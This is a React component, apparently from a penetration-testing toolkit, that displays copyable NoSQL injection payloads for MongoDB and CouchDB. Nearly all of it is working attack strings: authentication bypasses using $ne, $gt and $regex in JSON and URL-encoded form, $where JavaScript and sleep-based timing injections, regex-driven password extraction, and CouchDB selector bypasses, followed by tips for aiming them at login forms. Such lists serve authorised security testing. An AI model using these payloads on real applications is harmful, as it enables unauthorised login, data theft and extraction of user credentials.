import { Copy } from 'lucide-react';
import { Card, Button, PayloadBlock } from '../ui';
import { useClipboard } from '../../hooks/useClipboard';

export default function NoSQLTool() {
    const { copied, copy } = useClipboard();

    const payloads = [
        {
            category: 'MongoDB - Authentication Bypass',
            items: [
                { name: 'JSON - Not Equal', payload: '{"$ne": null}' },
                { name: 'JSON - Not Equal (1)', payload: '{"$ne": 1}' },
                { name: 'JSON - Greater Than', payload: '{"$gt": ""}' },
                { name: 'JSON - Not In Empty Array', payload: '{"$nin": []}' },
                { name: 'JSON - Exists', payload: '{"$exists": true}' },
                { name: 'JSON - Regex Match All', payload: '{"$regex": ".*"}' },
                { name: 'JSON - Regex Match (^)', payload: '{"$regex": "^"}' },
                { name: 'URL Encoded - NE null', payload: 'username[$ne]=null&password[$ne]=null' },
                { name: 'URL Encoded - GT empty', payload: 'username[$gt]=&password[$gt]=' },
                { name: 'URL Encoded - Regex', payload: 'username[$regex]=.*&password[$regex]=.*' },
            ]
        },
        {
            category: 'MongoDB - Operator Injection',
            items: [
                { name: 'Where Clause - True', payload: '{"$where": "1==1"}' },
                { name: 'Where Clause - Sleep', payload: '{"$where": "sleep(5000)"}' },
                { name: 'Where Clause - Function', payload: '{"$where": "function() { return true; }"}' },
                { name: 'Or Operator', payload: '{"$or": [{"username": "admin"}, {"username": "administrator"}]}' },
                { name: 'And Operator', payload: '{"$and": [{"price": {"$ne": 0}}, {"price": {"$exists": true}}]}' },
                { name: 'Select All', payload: '{"$where": "this.username == \'admin\'"}' },
            ]
        },
        {
            category: 'MongoDB - Data Exfiltration',
            items: [
                { name: 'Extract via Regex - Password', payload: '{"password": {"$regex": "^a.*"}}' },
                { name: 'Extract via Regex - Character', payload: '{"password": {"$regex": "^[a-z]"}}' },
                { name: 'Boolean Based - Match', payload: '{"username": "admin", "password": {"$regex": "^.{0,}"}}' },
                { name: 'Time Based - Sleep', payload: '{"$where": "sleep(5000) || 1==1"}' },
            ]
        },
        {
            category: 'CouchDB / Couchbase',
            items: [
                { name: 'Authentication Bypass', payload: '{"selector": {"$or": [{"username": "admin"}, {"_id": {"$gt": null}}]}}' },
                { name: 'All Documents', payload: '{"selector": {"_id": {"$gt": null}}}' },
                { name: 'Regex Match', payload: '{"selector": {"password": {"$regex": ".*"}}}' },
            ]
        },
        {
            category: 'NoSQL Injection Strings',
            items: [
                { name: 'Boolean True', payload: '\' || \'1\'==\'1' },
                { name: 'Boolean False', payload: '\' && \'0\'==\'1' },
                { name: 'Comment Out', payload: '\' || \'1\'==\'1\'--' },
                { name: 'Quote Break', payload: '\'||\'1\'||\'1' },
                { name: 'Array Injection', payload: '[$ne]' },
            ]
        }
    ];

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white mb-2">NoSQL Injection Payloads</h2>
                <p className="text-gray-400 text-sm">
                    Common NoSQL injection payloads for MongoDB, CouchDB, and other NoSQL databases
                </p>
            </div>

            {payloads.map((section, idx) => (
                <Card key={idx} className="!p-6">
                    <h3 className="text-lg font-bold text-[#a2ff00] mb-4">{section.category}</h3>
                    <PayloadBlock
                        content={section.items.map(item => `# ${item.name}\n${item.payload}`).join('\n\n')}
                    />
                </Card>
            ))}

            <Card className="bg-blue-500/10 border-blue-500/20">
                <h3 className="text-sm font-bold text-blue-300 mb-2">💡 Testing Tips</h3>
                <ul className="text-xs text-gray-300 space-y-1.5">
                    <li>• Test both JSON and URL-encoded formats</li>
                    <li>• Look for error messages revealing database type</li>
                    <li>• Try operator injection in login forms (username[$ne]=)</li>
                    <li>• Use regex for character-by-character data extraction</li>
                    <li>• Test $where clauses for JavaScript execution</li>
                    <li>• Check if input validation strips $ or {`{ }`} characters</li>
                </ul>
            </Card>
        </div>
    );
}
